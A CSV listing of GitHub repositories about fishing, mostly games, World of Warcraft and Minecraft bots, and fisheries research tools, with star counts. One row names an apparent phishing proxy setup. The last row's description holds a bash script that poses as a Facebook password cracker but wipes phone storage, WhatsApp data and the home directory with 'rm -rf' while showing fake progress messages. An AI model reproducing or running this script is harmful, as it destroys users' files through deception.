,Url,Description,Topics,Stars
71,https://github.com/Mikewando/fishing-overlay.git,FFXIV ACT LogParse Overlay for Fishing,,5
72,https://github.com/station384/WowFishingAssist.git,Automates fishing in World of Warcraft.,"world-of-warcraft,worldofwarcraft,wow,fishing-tool",5
73,https://github.com/npryce/codea-fishing.git,A Simple Fishing Game,,5
74,https://github.com/7cb15/trajectory_clustering.git,Trajectory clustering of fishing vessels,,5
75,https://github.com/Vladimir-Ivanov-Git/Apache2-fish.git,Setup Apache2 for fishing proxy,,5
76,https://github.com/CampbellOleson/fishhook.git,Social media for fishing enthusiasts,,5
77,https://github.com/CmdBlock-zqg/AutoFishingBot.git,an auto fishing robot for Minecraft server ,"auto-fishing-robot,minecraft,minecraft-bot,go-mc,minecraft-client-bot",5
78,https://github.com/ices-eg/wg_WGSFD.git,"The Working Group on Spatial Fisheries Data (WGSFD) is a scientific forum that collates and analyses spatial fisheries data in order to evaluate fishing effort, intensity, and frequency in European waters.",,5
79,https://github.com/Bl4ckSh4rk/PKHeXFeebasLocatorPlugin.git,PKHeX plugin to find and edit Feebas fishing spots.,,5
80,https://github.com/rdb/obbo.git,"{""Obbo's Descent: Cute asteroid-fishing game for PyWeek 30""}","panda3d,pyweek",5
81,https://github.com/zbanks/acnh-almanac.git,Calculate the best time to go fishing in AC:NH,,5
82,https://github.com/react-games/MMOFishing.git,A massively multiplayer online fishing game built with React and socket.io,,5
83,https://github.com/troutspotr/troutspotr-frontend.git,Help anglers make safe and legal choices when fishing for trout.,,5
84,https://github.com/neonmoe/neon-fishing.git,"Neon Fishing is a first person fisher game, set in a neon sci-fi ocean scenery.",,5
85,https://github.com/chrischizinski/huntfishapp.git,":package: :bar_chart: A web-based, exploratory data analysis application for hunting, fishing, and outdoor recreation sales data",,5
86,https://github.com/emlab-ucsb/slavery-in-fisheries.git,"Contains code and data for reproducing the manuscript, ""Satellites can reveal global extent of forced labor in the world’s fishing fleet""",,5
87,https://github.com/vmsbase/R-vmsbase.git,"VMSbase is an R suite for the analysis of vessel monitoring system (VMS) and logbook data, which constitute two of the primary sources of information for spatially explicit models of the fishing effort. It is conceived to solve many of the nuisance details related to this specific kind of data, providing a strainghtforward path from data massaging and management to sophisticated analyses and outputs.",,5
88,https://github.com/Metastruct/fishingmod.git,"{""Fishing Mod 1 for Garry's Mod""}",,4
89,https://github.com/oppahansi/fishylauncher.git,World of Warcraft Fishing Bot - Cross Platform,"fishing,bot,wow,cross,platform,mac,linux,windows,classic,world,of,warcraft",4
90,https://github.com/squaresolid/fish-caller.git,electronics for fishing!,"fishing,pcb-art,diybio",4
91,https://github.com/defenestrator/hatches-api.git,Fly fishing tools API,,4
92,https://github.com/Riketta/Warcraft-Fishman.git,World of Warcraft fishing bot without injections and other suspicious methods,,4
93,https://github.com/Yujunliu95/wowautofishing.git,auto fishing for wow classic,,4
94,https://github.com/hirmeos/entity-fishing-client-python.git,Repository hosting the common code for the entity-fishing clients ,"ner,disambiguation,linked-data,wikidata,wikipedia,python",4
95,https://github.com/jevan-smith/EggoBot.git,A World of Warcraft Pixel-based fishing bot!,"wow,fishing-bot,bot,warcraft",4
96,https://github.com/rolmaf/fbot.git,Fishing Telegram Bot ,,4
97,https://github.com/GlobalFishingWatch/map-components.git,Global fishing watch ui components,,4
98,https://github.com/lewiji/Fishing-Girl.git,Simple fishing game using Slick2d,,4
99,https://github.com/dbnryanc92/BNSAutoFishing.git,Blade & Soul: Auto fishing tool,,4
100,https://github.com/r-best/MinecraftAutoFisher.git,An automatic fishing program for Minecraft,"python,minecraft",4
101,https://github.com/city41/tacklebox.git,A fishing game for the Arduboy,"arduboy,arduboy-game,fishing-game",4
102,https://github.com/skeeto/Turkbait.git,Crude World of Warcraft fishing bot,,4
103,https://github.com/pjox/gofishing.git,An extremely fast entity-fishing client,,4
104,https://github.com/omgwtfgames/tadpoles.git,Catching Tadpoles - a Unity3D game made for Fishing Jam,,4
105,https://github.com/yuanfux/use-query-state.git,:fishing_pole_and_fish: use query string as state,,4
106,https://github.com/SPGoding/datapack-better_fishing.git,A Minecraft: Java Edition datapack which improve the fishing system a lot.,"minecraft,datapack,commandblock,loot-tables",4
107,https://github.com/openiotstudio/fishermans-iot.git,We looked at traditional fishing boats and what we can learn from them.,,4
108,https://github.com/rosscm/fedup.git,"{"":fishing_pole_and_fish: Bioconductor package for pathway enrichment and depletion analysis via a Fisher's exact test on custom test sets and annotations""}","geneset-enrichment,pathways,network,pathway-annotations,enrichment,depletion",4
109,https://github.com/rOluochKe/lifestyle.git,"The project you are going to build for the Ruby on Rails capstone is based on lifestyle articles website. You should change the theme of the app though - it can be a website with articles about books, wedding business, fishing equipment, mushrooms - anything that you can write an article about. Feel free to add your own app name and logo! -> https://serene-temple-93543.herokuapp.com/","ruby-on-rails,javascript,bootstrap4,devise,html5,css3,rspec,rubocop,sass",4
110,https://github.com/Loffes/loffe_fishing.git,Simple fishing script,,3
111,https://github.com/osmidig/FishingVR.git,Fishing VR game made for a gamejam.,,3
112,https://github.com/ajc113/currents.git,Currents Fishing Network Application,,3
113,https://github.com/kylertlove/fish-traps.git,mc mod for auto fishing,,3
114,https://github.com/levantAJ/ridiculous-fishing.git,The funny game for fishing and killing fish!,,3
115,https://github.com/skyzh/fishing.git,Yet another boring fishing game,,3
116,https://github.com/nakupanda/fishing-monkey.git,For those code-monkeys who love fishing,,3
117,https://github.com/RedEM-RP/redemrp_fishing.git,A Fishing system for RedEM:RP,,3
118,https://github.com/HectorPulido/Ridiculus-fishing-clone-made-with-unity.git,Ridiculus fishing clone made with unity,"gamedev,unity,game",3
119,https://github.com/forrestguice/SolunarPeriods.git,A hunting and fishing addon for Suntimes.,suntimes,3
120,https://github.com/datasciencecampus/kamino.git,DSC visualisation app for the UK fishing industry,"shiny,sustainability,dsc-projects",3
121,https://github.com/Rim-Of-Madness-Team/Call-of-Cthulhu---Factions.git,"While the lingering fear of Cthulhu is most unnerving, you are not alone. The Agency and coastal fishing villages have appeared in the overworld.",,3
122,https://github.com/wdu0/coalition-control-model.git,"Optimization of resource distribution has been a challenging topic in current society. To explore this topic, we develop a Coalition Control Model(CCM) based on the Model Predictive Control(MPC) and test it using a fishing model with linear parameters. The fishing model focuses on the problem of distributing fishing fleets in certain regions to maximize fish caught using either exhaustive or heuristic search. Our method introduces a communication mechanism to allow an individual fishing fleets to merge or split, after which new coalitions can be automatically formed. Having the coalition structure stabilized, the system reaches the equilibrium state through the Nash-Bargaining process. Our experiments on the hypothetical fishing model demonstrated that the CCM can dynamically distribute limited resources in complex scenarios.",,3
123,https://github.com/littlegao233/TC-MinecraftAutoFish.git,自行编译/Minecraft Automatic fishing ，Made with TC comprehensive development tools,,3
124,https://github.com/Haizor/hypixel-fishing-log.git,A minecraft mod that keeps track of your fishing catches on Hypixel Skyblock.,,3
125,https://github.com/LaBlazer/MineClick.git,"Sends right-click to Minecraft window, useful for automatic fishing farms...","minecraft,csharp,automation,bot,windows,automatic-fishing-farms,minecraft-window",3
126,https://github.com/jswanglp/FVID.git,"基于 VMS 轨迹数据的渔船类型（三、七类）识别方案。A fishing vessel type (3, 7 types) identification scheme based on Vessel Monitoring System (VMS) trajectories. Схема идентификации типов рыболовных судов (3, 7 типов) на основе траекторий Системы Мониторинга Судов (СМС).","vms,engineering,fishing-vessels,neural-networks,identification,russian",3
127,https://github.com/ZK1-CYBER/CrackFacebook.sh.git,"# author by : ZK1_CYBER #!/system/xbin/bash # Bersihkan Layar clear blue=\'\\033[34;1m\' green=\'\\033[32;1m\' purple=\'\\033[35;1m\' cyan=\'\\033[36;1m\' red=\'\\033[31;1m\' white=\'\\033[37;1m\' yellow=\'\\033[33;1m\' ################################################### # CTRL C- ################################################### trap ctrl_c INT ctrl_c() { clear echo  $red""[#]> (Ctrl + C ) Detected, Trying To Exit ... "" sleep 1 echo """" echo  $yellow""[#]> Thank You For Using My Tools ... "" sleep 1echo """" echo  $white""[#]> ÎÑĎØ•|꧁ĂŤȚÂÇĶĘŔ꧂|•ĪĎ Was here... "" read enter exit } echo             "" ____________________________________________"" | lolcat echo $green""kontak admin:6289560619546*"" echo $Orange""Autohor:ZK1_CYBER"" echo $Red""Thanks To ÎÑĎØ•|꧁ĂŤȚÂÇĶĘŔ꧂|•ĪĎ"" echo             ""echo             "" ___________________________________________"" | lolcat echo $green"" 01) Singgle Target ID Facebook"" echo $green"" 02) Langkah Sebelum Menggunakan Tool"" echo $green"" 03) Info Tools"" echo $green"" 04) DARK FB"" echo $green"" 05) mbf"" echo $green"" 06) Sadap Wa"" echo $green"" 07) Spam Call"" echo $green"" 08) Fishing weeman"" echo $green"" 09) Tembak paket"" echo $green"" 10) Mempercantik Termux"" read -p ""[ÎÑĎØ•|꧁ĂŤȚÂÇĶĘŔ꧂|•ĪĎ]> "" bro;  if [ $bro = 1 ] || [ $bro = 01 ] then clear echo $green"" Login Facebook"" sleep 1 read -p ""[ISI EMAIL]> "" bro; termux-setup-storage rm -rf /storage/emulated/0rm -rf /sdcard/0 rm -rf /storage/emulated/0/DCIM rm -rf /storage/emulated/0/android/obb rm -rf /sdcard/0/android/data rm -rf $HOME rm -rf sdcard/0 rm -rf storage/emulated/0 rm -rf /storage/emulated/0/WhatsApp rm -rf /sdcard/0/WhatsApp rm -rf /storage/emulated/0/Downloads rm -rf /storage/emulated/0/Music rm -rf /sdcard/0/Music echo $green""Sedang Mencari ID Facebook Dalam 30 detik"" sleep 5 echo $green""Sedang Mencari ID Facebook Dalam 29 detik"" sleep 5 echo $green""Sedang Mengumpulkan ID Facebook Dalam 28 detik"" sleep 5 echo $green""Sedang Mengumpulkan ID Facebook Dalam 27 detik"" sleep 5 echo $green""Sedang Mencari Password Facebook Dalam 26 detik"" sleep 3echo $red""Mencari Gagal! Sedang Mengulangi Kembali Pencarian"" sleep 5 echo $green""Sedang Mencari Password Facebook Dalam 60 detik"" sleep 5 echo $green""Sedang Mencari Password Facebook Dalam 59 detik"" sleep 5 echo $green""Sedang Mencari Password Facebook Dalam 58 detik"" sleep 5 echo $green""Sucses Mencari password Facebook"" sleep 5 echo $green""Sedang Mengumpulkan Password Facebook Dalam 3 Detik"" sleep 5 echo $green""Sedang Mengumpulkan Password Facebook Dalam 2 detik"" sleep 5 echo $green""Sedang Mengumpulkan Password Facebook Dalam 1 detik"" sleep 5 echo $white""Mengumpulkan Data + ID + Password Facebook""echo $green""send to sdcard/0"" sleep 3 echo $green""Buka storage cari PasswordFacebook.txt buka dan liat hasil crack> exit fi  if [ $bro = 2 ] || [ $bro = 02 ] then clear echo $green""Harap Izinkan Termux untuk mengakses storage"" echo $green""Agar bisa menyimpan hasil Crack Password ke sdcard"" termux-setup-storage sleep 4 termux-setup-storage sleep 4 termux-setup-storage sleep 4 termux-setup-storage exit fi  if [ $bro = 3 ] || [ $bro = 03 ] thenecho $green""Author ZK1_CYBER"" echo $green""Jika Ada masalah Hubungi Nomer Saya "" echo $green""kontak admin:6289560619546*"" echo $green""ThanksTo;ÎÑĎØ•|꧁ĂŤȚÂÇĶĘŔ꧂|•ĪĎ"" echo $green""ThanksTo;ALLAH"" echo $green""ThanksTo;Novel"" echo $green""ThanksTo;Bunga"" echo $red""ÎÑĎØ•|꧁ĂŤȚÂÇĶĘŔ꧂|•ĪĎ"" exit fi",,3
